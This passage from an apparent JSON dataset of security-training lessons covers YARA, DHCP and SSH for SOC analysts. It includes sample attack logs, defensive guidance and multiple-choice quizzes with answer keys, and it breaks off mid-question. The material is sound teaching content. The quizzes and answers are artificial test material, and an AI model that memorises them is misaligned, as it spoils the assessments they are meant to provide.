    "A rule has three parts: meta (documentation — author/description/threat, no effect on matching), strings (named $patterns: text, hex byte sequences with wildcards, or regex, with modifiers like nocase/wide), and condition (the Boolean logic — $a or ($b and $c), '2 of them', filesize checks).",
    "Run YARA from the command line: `yara rule.yar target` reports rule-name + path on a match (silence = no match); `-s` shows which strings fired and where, `-r` scans a directory recursively, and `-m` prints meta fields — this is how you verify a rule while writing and testing it.",
    "Good rules balance specific-enough-to-avoid-false-positives against general-enough-to-catch-variants: survey a sample with `strings`, anchor on hard-to-change internal strings/byte patterns rather than brittle ones like URLs, combine multiple weaker indicators, constrain with filesize, document in meta, and test against BOTH known-bad and known-good samples before deploying.",
    "In the SOC, YARA scales one discovery into environment-wide detection: hunt across files and memory/processes, consume rules from threat-intel reports, feed sandboxes/EDR pipelines, and retrohunt history — complementing Wireshark (traffic), Volatility (memory), and timeline analysis (sequence); its main limits are packed/encrypted malware evading static string matching (mitigated by scanning memory) and rules going stale once attackers change easily-swapped strings."
  ],
  "quiz": [
    {
      "question": "Why can a single well-written YARA rule detect many variants of a malware family, whereas a SHA-256 file hash cannot?",
      "options": [
        {
          "label": "A YARA rule matches on content patterns (strings and byte sequences), so it still fires on variants, while a hash identifies one exact file and changes completely if a single byte differs.",
          "value": "a"
        },
        {
          "label": "A YARA rule and a file hash work identically, but YARA rules are simply computed faster, which is the only practical advantage YARA offers over hashing.",
          "value": "b"
        },
        {
          "label": "A SHA-256 hash matches any file in the same malware family automatically, so YARA is only needed when the malware has no hash value at all.",
          "value": "c"
        },
        {
          "label": "A YARA rule works by storing the full original malware sample inside the rule, so it can only ever match that one identical file and nothing else.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A YARA rule matches on content patterns — distinctive strings and byte sequences — so it can catch related variants that share those patterns, whereas a SHA-256 hash fingerprints one exact file and changes entirely if even a single byte is altered, missing trivially modified variants. Option b is wrong because they do not work identically; the difference is pattern-matching vs exact-file matching. Option c is false because a hash matches only one exact file, not a family. Option d misdescribes YARA, which stores patterns, not the whole sample."
    },
    {
      "question": "An analyst writes a YARA rule whose only string is the Windows API name \"CreateProcessA\", which appears in thousands of legitimate programs. What is the likely problem, and what is the better approach?",
      "options": [
        {
          "label": "The rule is too narrow and will miss variants; the fix is to remove the condition section entirely so the rule matches every file it scans.",
          "value": "a"
        },
        {
          "label": "The rule is too broad and will cause many false positives; combine multiple distinctive indicators and anchor on patterns hard for the attacker to change.",
          "value": "b"
        },
        {
          "label": "The rule is perfectly tuned, because matching a common API name guarantees it will detect the malware family without ever flagging any benign software.",
          "value": "c"
        },
        {
          "label": "The problem is only performance; the rule is accurate but slow, so the fix is simply to run it on fewer files rather than changing its logic at all.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Keying a rule on a common API name that appears in thousands of legitimate programs makes it too broad, producing many false positives that bury analysts; the better approach is to combine multiple distinctive indicators and anchor on patterns the attacker cannot easily change, tuning specificity without becoming brittle. Option a misdiagnoses it as too narrow and suggests removing the condition, which would match everything. Option c is wrong because a common string flags benign software. Option d misframes a false-positive (accuracy) problem as merely performance."
    },
    {
      "question": "You run `yara -r Suspicious_Downloader.yar C:\\Endpoints\\` against a suspected packed malware sample and get no output at all, even though the analyst who wrote the rule confirmed it matches the same family's unpacked code. What is the most likely explanation, and what should you try next?",
      "options": [
        {
          "label": "No output always means the yara tool has crashed silently, so the fix is simply to re-run the exact same scan again on the same disk file until it eventually reports a match.",
          "value": "a"
        },
        {
          "label": "The sample is likely packed or encrypted on disk, hiding its strings until runtime; try scanning a memory image of a running/unpacked instance instead of the static file.",
          "value": "b"
        },
        {
          "label": "No output proves conclusively that this endpoint has zero malware of any kind, so no further scanning or investigation of this host is warranted.",
          "value": "c"
        },
        {
          "label": "The rule's meta section must be missing required fields, since YARA silently refuses to report any matches for rules that lack an author or description.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Packed or encrypted malware hides its real strings/code on disk and only reveals them once unpacked at runtime, so a rule built from unpacked strings can produce zero matches against the static packed file; scanning a memory image, where the code has unpacked itself to execute, often recovers the visible strings the static scan missed. Option a wrongly assumes silence means a crash. Option c overstates what a single static YARA scan (within its known limits) can prove. Option d invents a meta requirement that has no bearing on whether content patterns match."
    }
  ],
  "references": [
    "https://yara.readthedocs.io/en/stable/writingrules.html",
    "https://github.com/VirusTotal/yara",
    "https://attack.mitre.org/techniques/T1059/",
    "https://yara.readthedocs.io/en/stable/gettingstarted.html",
    "https://virustotal.github.io/yara/"
  ],
  "xp": 255,
  "estimatedMinutes": 54,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-dhcp-explained",
  "slug": "dhcp-explained-standalone",
  "title": "DHCP Explained: How Devices Get Their Network Identity",
  "topic": "Network Protocols",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "When a laptop connects to a network and simply works — with an IP address, a way to reach the internet, and working name resolution — a protocol called DHCP did that automatically, in under a second, before the user noticed. This lesson is a focused, single-topic deep dive into DHCP: what it is, why it exists, exactly how the four-step exchange works, which ports it uses, what the traffic looks like on the wire, and why the humble DHCP lease log is one of a SOC analyst's most useful tools for answering the question 'which device was that?'",
  "sections": [
    {
      "heading": "What DHCP Is and Why It Exists",
      "content": "**DHCP** stands for **Dynamic Host Configuration Protocol**. Its single job is to automatically hand a device everything it needs to work on a network the moment it connects — with no human typing settings by hand.\n\nWithout DHCP, every device would need an administrator to manually assign it an IP address and network settings, which is unworkable at any real scale (imagine configuring 5,000 laptops by hand, and reconfiguring every time one moves). DHCP automates this completely.\n\nThe real-life analogy is a **hotel check-in desk**. You arrive with nothing; the receptionist assigns you a room number (your IP address), tells you how to reach the front desk (the gateway) and the hotel directory (DNS), and gives you the room for a set number of nights (the lease). When you leave, the room goes back into the pool for the next guest.\n\nSpecifically, DHCP provides a connecting device with four essentials:\n\n- **An IP address** — the device's identity on the network.\n- **A subnet mask** — which nearby addresses count as local.\n- **A default gateway** — the door out to the rest of the network and the internet.\n- **DNS server addresses** — so the device can then translate names into addresses.\n\nAll of this is handed out on a **lease** — a time-limited assignment. Before the lease expires, the device renews it, which is why a laptop might keep the same address for days, then get a different one after a long absence. Understanding that DHCP is *automatic, temporary, and centrally managed* is the foundation for everything that follows, including why its logs are so valuable to an analyst."
    },
    {
      "heading": "How DHCP Works: The DORA Exchange and Its Ports",
      "content": "DHCP assigns settings through a four-step conversation that happens the instant a device joins, remembered by the word **DORA**:\n\n1. **Discover** — The new device has no address yet, so it **broadcasts** a message to the whole local network: \"Is there a DHCP server out there? I need settings.\" (A broadcast reaches everyone because the device does not yet know who the server is.)\n2. **Offer** — A **DHCP server** replies: \"Here is an IP address you can use, along with the gateway and DNS.\"\n3. **Request** — The device replies: \"Yes, I'll take that offered address.\" (It broadcasts this so any other DHCP servers know their offers were declined.)\n4. **Acknowledge (ACK)** — The server confirms: \"It's yours,\" and records the **lease** — which address went to which device, and for how long.\n\n**The ports:** DHCP runs over **UDP**, with the **server listening on port 67** and the **client on port 68**. These fixed ports are how the broadcast messages find their way even before the client has an identity.\n\n**Behind the scenes:** the server identifies each device by its **MAC address** (the hardware address of the network card), which is how it can offer a returning device the same IP it had before. The server maintains a **scope** — the pool of addresses it is allowed to hand out — and a **lease table** recording every current assignment. When you understand that the server is keeping a running record of MAC-address-to-IP-address-and-time, you already understand why DHCP logs answer the analyst's key question: which physical device held a given IP at a given moment."
    },
    {
      "heading": "What DHCP Looks Like in Practice",
      "content": "In everyday life DHCP is invisible — you connect and it just works — but the exchange is very real and observable.\n\n**On the wire**, a packet capture of a device joining shows the DORA sequence clearly: a `DHCP Discover` broadcast from `0.0.0.0` (the device has no address yet) to `255.255.255.255` (everyone), then a `DHCP Offer`, a `DHCP Request`, and a `DHCP ACK`. Seeing these four packets in order is the signature of a successful join.\n\n**On a device**, you can see the result of DHCP with simple commands: `ipconfig /all` on Windows or `ip addr` / `nmcli` on Linux shows the assigned IP, the DHCP server that gave it, the lease times, and the gateway and DNS it received. `ipconfig /release` and `ipconfig /renew` on Windows manually give up and re-request a lease — literally driving the DORA exchange by hand.\n\n**On the server side**, the DHCP server (often the same box that runs DNS, or a dedicated appliance, or the router in a small network) maintains the **lease table**: a list of every active lease showing the IP, the client's MAC address, the hostname, and the lease start and expiry. This table, and the log of lease events over time, is the artifact that matters most to a SOC.\n\nA useful mental picture: every time a device appears, renews, or leaves, the DHCP server writes it down. Over a day, that log is a complete record of *which devices were present on the network and what address each one held at each moment* — a timeline of network membership that exists whether or not anyone is watching."
    },
    {
      "heading": "DHCP Snooping: The Switch-Level Defense Against Rogue Servers",
      "content": "Because a rogue DHCP server is such a serious risk, network switches include a purpose-built defense called **DHCP snooping**. When enabled, the switch classifies each of its ports as either **trusted** (the port connected to the real, authorised DHCP server) or **untrusted** (every ordinary port where end-user devices plug in). The switch then enforces a simple rule: DHCP server traffic — Offers and ACKs — is only allowed to come from a trusted port. If a device plugged into an untrusted port tries to send a DHCP Offer, the switch silently drops it. This single rule closes off the rogue-server threat at the network layer, before it ever reaches a victim.\n\nDHCP snooping also builds something valuable for later: a **binding table**, a switch-maintained record of which IP address, MAC address, and port go together for every legitimate lease it has observed. This binding table is what powers two related defenses — **Dynamic ARP Inspection**, which stops attackers from forging address-resolution replies, and **IP Source Guard**, which stops a device from sending traffic claiming an IP address it was never actually leased. All three features trace back to the same idea: once the switch knows the true, DHCP-assigned mapping of IP to MAC to port, it can reject anything that doesn't match.\n\nAn additional detail worth knowing is **Option 82** (the DHCP Relay Agent Information option), which a switch or relay can insert into a Discover message to record exactly which physical port and switch the request came from — useful both for giving different address pools to different parts of a building and for after-the-fact investigation, since it ties a lease directly to a physical location.\n\nFor an analyst, the practical takeaway is that DHCP snooping is a preventive control, not a monitoring one — it stops many rogue-server attacks from ever succeeding, but it does not eliminate the need to watch DHCP logs. A switch without snooping enabled, or a segment outside its coverage, is still exposed, so verifying that snooping is actually configured on access switches is a legitimate, valuable finding for a SOC or an internal audit to raise."
    },
    {
      "heading": "Why DHCP Matters to a SOC Analyst",
      "content": "DHCP is not a glamorous protocol, but its logs solve a problem analysts hit constantly, and it has its own small set of abuses to watch.\n\n### The killer use: mapping an IP to a real device\n\nSecurity alerts almost always name an **IP address** — \"suspicious activity from 10.4.2.17.\" But IP addresses are handed out temporarily and reused, so `10.4.2.17` might be one laptop this morning and another tomorrow. To answer \"*which actual machine* was `10.4.2.17` at 2:14 a.m.?\", you consult the **DHCP lease log**, which ties that IP to a specific MAC address and hostname at that time. This IP-to-device mapping is a routine, essential pivot in nearly every investigation, and DHCP is where it comes from.\n\n**The abuses to watch:**\n\n- **Rogue DHCP server** — an unauthorised device (planted by an attacker, or a misconfigured router) starts handing out its own settings. Because clients accept the first offer they receive, a rogue server can assign victims a malicious gateway or DNS, routing their traffic through the attacker (a man-in-the-middle position). Multiple DHCP servers offering leases where there should be one is the red flag.\n- **DHCP starvation** — an attacker floods the server with fake Discover requests using spoofed MAC addresses, exhausting the address pool so legitimate devices cannot get a lease (a denial-of-service), sometimes as a setup for a rogue server to take over.\n- **Unexpected new devices** — a lease suddenly requested by an unknown MAC address can reveal something new (and unwanted) plugged into the network.\n\nThe analyst takeaways are twofold. First, **know that the DHCP log is your IP-to-device Rosetta Stone** — reach for it whenever an alert gives you an internal IP and you need to know the real machine behind it. Second, treat **multiple DHCP servers, address-pool exhaustion, and unfamiliar devices** as signals worth investigating. A protocol whose whole purpose is convenience turns out to be one of the quiet foundations of network investigation."
    },
    {
      "heading": "A Worked Example: Spotting a Rogue DHCP Server in the Logs",
      "content": "Putting the whole lesson together, imagine your DHCP server's log shows the following for one client over a few seconds:\n\n```\n10:02:01 DHCPDISCOVER from 00:1A:2B:3C:4D:5E via eth0\n10:02:01 DHCPOFFER 10.4.2.55 to 00:1A:2B:3C:4D:5E (server-id 10.4.0.1)\n10:02:02 DHCPOFFER 10.4.2.201 to 00:1A:2B:3C:4D:5E (server-id 10.4.2.250)\n10:02:02 DHCPREQUEST for 10.4.2.201 (server-id 10.4.2.250)\n10:02:02 DHCPACK 10.4.2.201 to 00:1A:2B:3C:4D:5E (server-id 10.4.2.250)\n```\n\nWalking through it the way an analyst would: the client broadcasts a Discover, and — this is the tell — **two different Offers arrive, from two different server IDs** (`10.4.0.1`, the known authorised server, and `10.4.2.250`, which is not in the asset inventory). The client, following the DORA rule of accepting the first usable Offer it likes, requests and receives its lease from `10.4.2.250` — the unauthorised device. From this moment, that client's gateway and DNS were whatever the rogue server chose to hand out, which may not be the organisation's real gateway at all.\n\n**The questions an analyst asks from this log:** Is `10.4.2.250` a known, authorised DHCP server in the asset inventory? (If not, this is confirmed rogue activity.) Which switch port did that server-id's traffic originate from, and does DHCP snooping cover it? What gateway and DNS did the ACK actually hand to the client — can that be recovered from the client's own configuration to see if it was redirected? And finally, which other clients on the same broadcast segment also received Offers from `10.4.2.250` in this window, since a rogue server broadcasts to everyone, not just one victim?\n\nThis short log excerpt demonstrates the entire chapter in miniature: DORA's structure is what makes the two-Offer anomaly visible, port 67/68 and the server-id field are what let you tell the two servers apart, and the lease table is what lets you reconstruct, after the fact, exactly who was exposed."
    }
  ],
  "keyTakeaways": [
    "DHCP (Dynamic Host Configuration Protocol) automatically gives a connecting device its IP address, subnet mask, default gateway, and DNS servers on a time-limited lease, so networks work without manual per-device configuration.",
    "It assigns settings via the four-step DORA exchange (Discover broadcast, Offer, Request, Acknowledge), running over UDP with the server on port 67 and the client on port 68, identifying devices by MAC address and recording each assignment in a lease table.",
    "The DHCP lease log is a SOC analyst's key tool for mapping an IP address to the real device (MAC/hostname) that held it at a specific time — an essential pivot since alerts name IPs but IPs are temporary and reused.",
    "Watch for DHCP abuse: a rogue DHCP server (handing out a malicious gateway/DNS for man-in-the-middle), DHCP starvation (flooding fake requests to exhaust the pool), and unexpected new devices requesting leases.",
    "Switches defend against rogue DHCP servers with DHCP snooping (trusted vs untrusted ports, a binding table, and Option 82), which also underpins Dynamic ARP Inspection and IP Source Guard — verifying it is enabled on access switches is a valuable SOC/audit finding."
  ],
  "quiz": [
    {
      "question": "A security alert reports suspicious outbound traffic from internal IP 10.4.2.17 at 02:14. To identify which physical machine actually held that address at that moment, which data source do you consult, and why is it necessary?",
      "options": [
        {
          "label": "The DNS server cache, because DNS permanently maps every internal IP address to a fixed physical device that never changes over time.",
          "value": "a"
        },
        {
          "label": "The DHCP lease log, because IP addresses are leased temporarily and reused, so you need the lease record tying that IP to a MAC/hostname at that time.",
          "value": "b"
        },
        {
          "label": "The firewall allow list, because it stores a permanent one-to-one assignment of every internal IP address to a named employee workstation.",
          "value": "c"
        },
        {
          "label": "No lookup is needed, because an internal IP address like 10.4.2.17 always belongs to the exact same device on every day of the year.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "DHCP hands out IP addresses on temporary leases and reuses them, so an IP alone does not identify a device across time; the DHCP lease log records which MAC address and hostname held a given IP at a given moment, which is exactly the mapping you need. Option a is wrong because DNS resolves names to IPs and does not permanently bind IPs to physical devices. Option c misdescribes a firewall allow list. Option d is false because leased IPs are reused across different devices."
    },
    {
      "question": "On a network you discover that two different servers are both responding to devices' DHCP Discover broadcasts with Offers, when only one authorised DHCP server should exist. Why is this a security concern?",
      "options": [
        {
          "label": "It is harmless, because clients always ignore every Offer and instead configure their own IP address, gateway, and DNS entirely on their own.",
          "value": "a"
        },
        {
          "label": "A rogue DHCP server can assign victims a malicious gateway or DNS, since clients accept the first Offer, letting the attacker intercept their traffic.",
          "value": "b"
        },
        {
          "label": "It simply doubles network speed, because two DHCP servers share the workload of assigning addresses and pose no security risk whatsoever.",
          "value": "c"
        },
        {
          "label": "It only affects printers, because DHCP Offers are used exclusively to configure printing devices and never assign settings to laptops or servers.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A second, unauthorised DHCP server is a rogue server: because clients accept the first Offer they receive, the attacker can hand victims a malicious default gateway or DNS server and route their traffic through attacker-controlled infrastructure for a man-in-the-middle position. Option a is false because clients do accept DHCP Offers rather than self-configuring. Option c wrongly frames a rogue server as a harmless performance boost. Option d is incorrect because DHCP configures all kinds of devices, not just printers."
    },
    {
      "question": "A DHCP log shows a client receiving two Offers from two different server-id values within the same second, and the lease was ultimately granted by the server-id not listed in your asset inventory. Which switch-level control is specifically designed to prevent this?",
      "options": [
        {
          "label": "DHCP snooping, which only allows DHCP server replies like Offers and ACKs from switch ports explicitly marked as trusted.",
          "value": "a"
        },
        {
          "label": "DHCP audit logging, because simply recording DHCP events in a log file automatically blocks any unauthorised server from replying.",
          "value": "b"
        },
        {
          "label": "Port mirroring, because copying switch traffic to a monitoring port on its own prevents any second DHCP server from responding.",
          "value": "c"
        },
        {
          "label": "VLAN tagging, because separating devices into VLANs by itself stops any device from ever sending a DHCP Offer message.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "DHCP snooping classifies switch ports as trusted or untrusted and drops DHCP server traffic (Offers/ACKs) arriving on untrusted ports, which is exactly the control that stops a rogue server plugged into a normal access port from ever reaching victims. Option b wrongly claims logging alone blocks anything — logging is only visibility, not prevention. Option c misapplies port mirroring, a monitoring feature with no blocking capability. Option d is wrong because VLANs segment broadcast domains but do not, by themselves, validate which devices may act as a DHCP server."
    }
  ],
  "references": [
    "https://datatracker.ietf.org/doc/html/rfc2131",
    "https://learn.microsoft.com/en-us/windows-server/networking/technologies/dhcp/dhcp-top",
    "https://attack.mitre.org/techniques/T1557/"
  ],
  "xp": 220,
  "estimatedMinutes": 44,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-ssh-explained",
  "slug": "ssh-explained-standalone",
  "title": "SSH Explained: Secure Remote Access and Its Abuse",
  "topic": "Network Protocols",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every day, administrators manage thousands of servers they will never physically touch, typing commands into machines in data centres and clouds around the world. The protocol that makes this safe is SSH. This focused lesson covers SSH end to end: what it is and why it replaced older tools, exactly how the encrypted connection and authentication work, the port it uses, what the traffic looks like, how key-based login differs from passwords, and why SSH activity — brute force, unusual logins, and tunnelling — is some of the highest-value data a SOC analyst reviews.",
  "sections": [
    {
      "heading": "What SSH Is and Why It Replaced Telnet",
      "content": "**SSH** stands for **Secure Shell**. It is a protocol that lets a person or a program securely log into and control another computer over a network, with the entire session **encrypted** so that no eavesdropper can read what is sent.\n\nThe real-life analogy is a **secure remote control** for a machine sitting somewhere else — a server in a data centre, a cloud host — as if you were typing directly at its keyboard, except everything travelling between you and it is scrambled and protected.\n\nSSH exists because of the failures of what came before it. The older tool, **Telnet**, did the same remote-login job but sent everything — including **usernames and passwords** — as plain, readable text across the network. Anyone capturing the traffic could read the credentials directly. SSH was created to fix exactly this: it encrypts the whole session, so even someone intercepting the packets sees only meaningless ciphertext. For this reason, SSH almost entirely replaced Telnet for administration, and finding Telnet still in use is itself a security concern.\n\nWhat administrators actually do over SSH is the daily work of running infrastructure: executing commands, editing configuration files, restarting services, checking logs, and — via related tools like `scp` and `sftp` that run over SSH — copying files securely. It is the primary way Linux and Unix servers (and increasingly network devices and even Windows) are managed remotely. Because SSH grants a real, interactive foothold on a machine, understanding it is essential both for the people who use it legitimately and for the analysts who must spot when someone uses it maliciously."
    },
    {
      "heading": "How SSH Works: Handshake, Keys, and Port 22",
      "content": "SSH is a **client/server** protocol that listens on **TCP port 22**. The connection is established in a careful sequence that puts encryption in place *before* any secret is ever sent.\n\n1. **Connection and negotiation.** The **client** opens a TCP connection to the **server** on port 22 and the two agree on which encryption algorithms to use.\n2. **Key exchange (the handshake).** Before anything sensitive is transmitted, the two sides perform a cryptographic **key exchange** that establishes a shared secret. From this point on, *everything* — the login attempt, the commands, the output — is encrypted.\n3. **Server authentication.** The client checks the server's **host key** to confirm it is really talking to the intended machine and not an impostor. (This is why you see a 'the authenticity of host … can't be established' prompt the first time you connect.)\n4. **Client authentication.** Only now does the user prove who they are, in one of two ways (below).\n5. **Session.** Once authenticated, the user gets a shell (or runs a command / transfers a file) until they log out.\n\n**The two ways to authenticate** are the crux of SSH security:\n\n- **Password authentication** — the user types a password, sent inside the already-encrypted channel. Simple, but vulnerable to guessing (brute force).\n- **Public-key authentication** — the professional standard. The user holds a secret **private key**; the server holds the matching **public key**. The client proves it possesses the private key *without ever sending it*. This is far stronger than a password and cannot be brute-forced the same way.\n\n**Behind the scenes**, the encryption means that to a network monitor, an SSH session on port 22 looks like an opaque encrypted tunnel — you can see *that* a connection happened, from where, for how long, and how much data moved, but not the commands inside. That property is exactly what makes SSH both secure for admins and attractive to attackers, as the final section explains."
    },
    {
      "heading": "SSH in Practice: Logins, Keys, and Config",
      "content": "In practice SSH is driven from a command line and shaped by a few key files and behaviours worth recognising.\n\n**Connecting** is as simple as `ssh user@server` — which contacts `server` on port 22 and logs in as `user`. Copying files uses `scp file user@server:/path` or `sftp`, both of which ride on the same encrypted SSH channel.\n\n### Keys in practice\n\nPublic-key authentication relies on a **key pair** generated with `ssh-keygen`, producing a private key (kept secret on the client, often in `~/.ssh/id_rsa` or `id_ed25519`) and a public key. The public key is placed on the server in the user's `~/.ssh/authorized_keys` file — literally a list of the keys allowed to log in as that user. This is powerful and, from a security standpoint, worth watching: **an attacker who adds their own public key to `authorized_keys` gives themselves durable, password-free access** (a common persistence technique).\n\n**Server configuration** lives in `/etc/ssh/sshd_config` and controls the protocol's security posture — whether password login is allowed, whether the powerful `root` account may log in directly (`PermitRootLogin`), and which port SSH listens on. Hardening SSH means disabling root login, preferring keys over passwords, and limiting who can connect.\n\n**On a Linux server, SSH activity is logged** — successful and failed logins appear in authentication logs (such as `/var/log/auth.log` or via `journalctl`), recording the source IP, the username, and whether the attempt succeeded. These logs are the raw material for the SOC detections in the next section. A single line like 'Accepted publickey for admin from 203.0.113.9' or 'Failed password for root from …' carries exactly the who/where/how-succeeded information an analyst needs."
    },
    {
      "heading": "SSH Host Keys and Trust on First Use",
      "content": "Every SSH server holds a **host key** — a cryptographic identity unique to that machine — and the client's very first action in the handshake is to check it. But this raises an obvious question: the first time you ever connect to a new server, how can the client possibly know what the 'right' host key is supposed to be?\n\nThe answer is a model called **Trust On First Use (TOFU)**. The first time you connect, SSH shows you the server's key fingerprint and asks you to confirm it — the familiar 'the authenticity of host … can't be established, are you sure you want to continue connecting?' prompt. If you accept, that fingerprint is saved to your local **known_hosts** file. On every future connection, the client silently compares the server's presented key against the saved one. If they match, nothing is shown and the connection proceeds; the trust from that first confirmation carries forward automatically.\n\nThis is why the single most important SSH security prompt is not the first-time question, but what happens **after** a key is already saved: a **'WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED'** error. This means the server presented a *different* key than the one you trusted before — either the server was legitimately rebuilt or reconfigured, or, far more seriously, you are being routed to an impostor machine performing a **man-in-the-middle attack**, intercepting your session by pretending to be the real server. SSH clients refuse to connect automatically when this happens precisely because the consequences of ignoring it are severe: an attacker in the middle could capture credentials or session data even though the channel still 'looks' encrypted to the user.\n\nFor an analyst, host-key-changed warnings reported by users or found in client logs deserve real scrutiny rather than a reflexive 'just delete the old entry and reconnect.' The right first question is *why* did the key change — was the server rebuilt on a known maintenance window, or is this the first sign of a compromised network path? Large organisations avoid relying on TOFU at all for their own infrastructure by distributing known host keys centrally (via configuration management or a **CA-signed host certificate**), removing the guesswork — and the risk — from that very first connection."
    },
    {
      "heading": "Why SSH Matters to a SOC Analyst",
      "content": "Because SSH grants full, interactive control of a machine, it is simultaneously an administrator's essential tool and a top target and technique for attackers. SSH events are among the highest-value data a SOC reviews.\n\n**What analysts hunt for:**\n\n- **Brute-force attacks.** A flood of **failed password logins** on port 22 from one source is an attacker guessing credentials — one of the most common events on any internet-facing server. A brute force that suddenly *succeeds* (many failures followed by an 'Accepted password') is a likely compromise.\n- **Logins from unusual sources.** A successful SSH login from an unfamiliar country, at an odd hour, or to a server the source has never administered can signal a compromised account or stolen key. Comparing against normal patterns is key.\n- **Unexpected SSH exposure.** A server whose port 22 is reachable from the whole internet (rather than restricted to admin networks) is an invitation to brute force; SSH open to `0.0.0.0/0` is a classic finding.\n- **SSH tunnelling and pivoting.** SSH can forward other traffic through its encrypted tunnel (port forwarding). Attackers abuse this to **pivot** — reaching deeper internal systems through a compromised foothold, hidden inside the encrypted SSH channel. Unusual or long-lived SSH sessions carrying unexpected traffic are a lead.\n- **New authorized keys and config changes.** As noted, a new entry in `authorized_keys`, or a weakening of `sshd_config`, is a persistence/defence-evasion signal.\n\n**Why it matters so much** is that a successful SSH login is not a minor event — it is someone gaining a command shell on a machine. The stakes make even a single anomalous SSH login worth investigating. The analyst's mindset is to treat SSH authentication logs as a priority feed: baseline who normally connects to what, from where, using which method, and alert on the deviations — the brute force, the foreign login, the newly added key. Master SSH and you can both appreciate why it is the backbone of secure administration and recognise the moment an attacker turns that same power against the network."
    },
    {
      "heading": "A Worked Example: Reading an SSH Auth Log",
      "content": "Here is a simplified but realistic excerpt from a Linux server's authentication log during an attack:\n\n```\n03:14:01 sshd: Failed password for root from 198.51.100.23 port 51422 ssh2\n03:14:02 sshd: Failed password for root from 198.51.100.23 port 51430 ssh2\n03:14:03 sshd: Failed password for root from 198.51.100.23 port 51441 ssh2\n... (312 more failures over 6 minutes) ...\n03:20:47 sshd: Accepted password for root from 198.51.100.23 port 52108 ssh2\n03:20:47 sshd: pam_unix(sshd:session): session opened for user root\n```\n\nWalking through it as an analyst: the source IP `198.51.100.23` sends hundreds of `Failed password` attempts against the `root` account in under seven minutes — far too fast and too repetitive to be a person mistyping, and this is the signature of an automated brute-force tool. Then, critically, the pattern changes: an `Accepted password` line appears from the *same* IP, followed immediately by `session opened` — meaning the attacker's guessing worked, and they now have an interactive shell as `root`, the most privileged account on the box.\n\n**The questions this log demands you answer next:** What did that session do once opened — check the shell history and any subsequent commands logged for that session. Is `198.51.100.23` a known administrative IP, or an unfamiliar address (a quick lookup of its geolocation and reputation is a fast next step)? Was password authentication even supposed to be enabled for root on this server, or does `sshd_config` need hardening (`PermitRootLogin no`, disable password auth) so this cannot happen again? And finally, were any new entries added to `~/.ssh/authorized_keys` during or after this session — since an attacker with a shell often plants a key immediately to guarantee they can return even after the password is changed.\n\nThis one log excerpt is, in miniature, the whole SSH security story: the plaintext-looking auth log reveals exactly the volume-then-success pattern that defines a successful brute force, and the follow-up questions it prompts are the same ones covered in the sections above — source reputation, configuration hardening, and persistence via keys."
    }
  ],
  "keyTakeaways": [
    "SSH (Secure Shell) provides encrypted remote login and control of a machine over TCP port 22, replacing Telnet, which sent credentials and commands in readable plaintext.",
    "It establishes encryption via a key-exchange handshake before any secret is sent, verifies the server's host key, then authenticates the user by password (guessable) or, preferably, public-key authentication where the client proves it holds a private key without transmitting it.",
    "In practice, public keys allowed to log in are listed in ~/.ssh/authorized_keys and server behaviour is set in /etc/ssh/sshd_config; Linux logs SSH logins (source IP, user, success/fail) in auth logs like /var/log/auth.log.",
    "SOC analysts treat SSH events as high-value: hunt brute-force floods (and brute force that then succeeds), logins from unusual sources, internet-exposed port 22, SSH tunnelling/pivoting, and attacker-added authorized_keys or weakened sshd_config.",
    "SSH host keys use a Trust On First Use model (saved in known_hosts); a 'host key changed' warning after the first connection can mean a legitimate server rebuild or an active man-in-the-middle attack and should always be investigated, not dismissed."
  ],
  "quiz": [
    {
      "question": "Why did SSH replace Telnet as the standard tool for remotely administering servers, and on which port does SSH listen?",
      "options": [
        {
          "label": "SSH encrypts the entire session including credentials and commands, whereas Telnet sent everything as readable plaintext an eavesdropper could capture; SSH uses TCP port 22.",
          "value": "a"
        },
        {
          "label": "SSH automatically assigns IP addresses to the servers it connects to, which Telnet could not do, and it listens on UDP port 67 to hand out those addresses.",
          "value": "b"
        },
        {
          "label": "SSH is faster than Telnet because it skips all encryption to save time, and it listens on TCP port 3389 to reach remote desktops more quickly.",
          "value": "c"
        },
        {
          "label": "SSH and Telnet are equally secure, but SSH became standard only because it uses a more memorable port number, which happens to be TCP port 21.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "SSH replaced Telnet because it encrypts the whole session — credentials and commands included — while Telnet transmitted everything in readable plaintext that anyone capturing traffic could steal; SSH listens on TCP port 22. Option b describes DHCP (port 67), not SSH. Option c is wrong because SSH does not skip encryption and 3389 is RDP. Option d is false because Telnet is insecure and 21 is FTP, not SSH."
    },
    {
      "question": "On an internet-facing Linux server you see hundreds of 'Failed password for root' entries from one IP over a few minutes, followed by a single 'Accepted password for root' from the same IP. What has most likely happened?",
      "options": [
        {
          "label": "A routine backup completed, because backup software authenticates over SSH by deliberately failing hundreds of password attempts before finally succeeding once.",
          "value": "a"
        },
        {
          "label": "A successful SSH brute-force attack: the attacker guessed the root password after many attempts, and the 'Accepted' entry indicates a likely compromise to investigate.",
          "value": "b"
        },
        {
          "label": "Nothing of concern, because repeated failed root logins from a single external IP are the normal, expected way administrators log in to production servers.",
          "value": "c"
        },
        {
          "label": "The server's clock drifted, because time-synchronisation errors are logged by SSH as a burst of failed passwords followed by one accepted password entry.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Many failed password attempts followed by an 'Accepted password' from the same source is the classic signature of a brute-force attack that finally guessed the credentials — here for the powerful root account — indicating a likely compromise that must be investigated. Option a invents backup behaviour that does not exist. Option c wrongly normalises brute-force activity. Option d is false because clock drift is not logged as failed/accepted password attempts."
    },
    {
      "question": "A system administrator SSHes into a server they have connected to for months and this time receives a 'WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED' error instead of the usual silent connection. What should they do, and why?",
      "options": [
        {
          "label": "Ignore the warning and connect anyway, because SSH host key warnings are purely cosmetic and never indicate a real change to the server.",
          "value": "a"
        },
        {
